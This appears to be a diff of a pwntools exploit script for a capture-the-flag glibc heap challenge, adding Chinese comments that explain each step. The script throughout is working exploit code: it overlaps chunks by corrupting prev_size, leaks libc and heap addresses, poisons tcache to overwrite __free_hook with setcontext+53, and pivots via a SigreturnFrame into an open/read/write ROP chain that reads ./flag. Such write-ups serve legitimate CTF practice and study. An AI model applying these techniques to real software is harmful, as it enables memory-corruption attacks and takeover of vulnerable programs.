@@ -39,7 +39,8 @@ add(10, 0x10)
 #填充tcache 0x90
 for i in range(8):
     free(i)
-overedit(8, b'1' * 0x80 + p64(0x120) , 0)#改变第9块的presize和preinuse，使其释放时把第8第7块一块合并了，这样只要第8块中出现libc地址就能用show函数得到
+overedit(8, b'1' * 0x80 + p64(0x120) , 0)#改变第9块的presize和preinuse，使其释放时把第8第7块一块合并了，实现堆块重叠，这样只要第8块中出现libc地址就能用show函数得到
+# gdb.attach(p)
 free(9)
 add(11, 0x98)
 add(12, 0x78)
@@ -78,27 +79,24 @@ p.recvuntil(b'Content: ')
 p.recvuntil(b'1'*16)
 heap_addr=u64(p.recv(6).ljust(8,b'\x00'))
 print("heap_addr: ",hex(heap_addr))
-edit(8,p64(0)+p64(91)+p64(free_hook))
-# gdb.attach(p)
-add(1, 0x88)
+edit(8,p64(0)+p64(91)+p64(free_hook))#改变tcache中第一个free chunk的fd指针为free_hook
 # pause()
-add(2, 0x88)
+add(1, 0x88)
+add(2, 0x88)#index为2的堆开在了free_hook上，改变freehook为setcontext+53
 edit(2,p64(setcontext+53))
 
 frame = SigreturnFrame()
-frame.rsp=heap_addr+0x2d0
-# frame.rdi = 0
-# frame.rsi = heap_addr + 0x2d0
-# frame.rdx = 0x200
+frame.rsp=heap_addr+0x2d0#对这个值的要求不高，但不写的话会变成0就出错了
 frame.rbp=heap_addr+0x2d0
 frame.rip = leave_ret
 # edit()
 byte_frame=bytes(frame)
-print(byte_frame ,len(byte_frame),type(byte_frame))
 # gdb.attach(p,'b free')
 edit(1,b'./flag\x00')
 #下面两种方法得到orwrop链都可以
-orw_payload=p64(0xdeadbeef)
+#heap_addr+0x1c0为flag
+#heap_addr+0x1f0为随便选的输出flag的地方
+orw_payload=p64(0xdeadbeef)#rbp
 if 1==0:
     orw_payload+=flat([pop_rdi,heap_addr+0x1c0,pop_rsi,0,open_addr])
     orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,read_addr])
@@ -109,5 +107,5 @@ else:
     orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x20,pop_rax,1,syscall])
 edit(14,orw_payload)
 edit(15,byte_frame)
-free(15)
+free(15)#自动完成setcontext，然后执行orwrop链
 p.interactive()
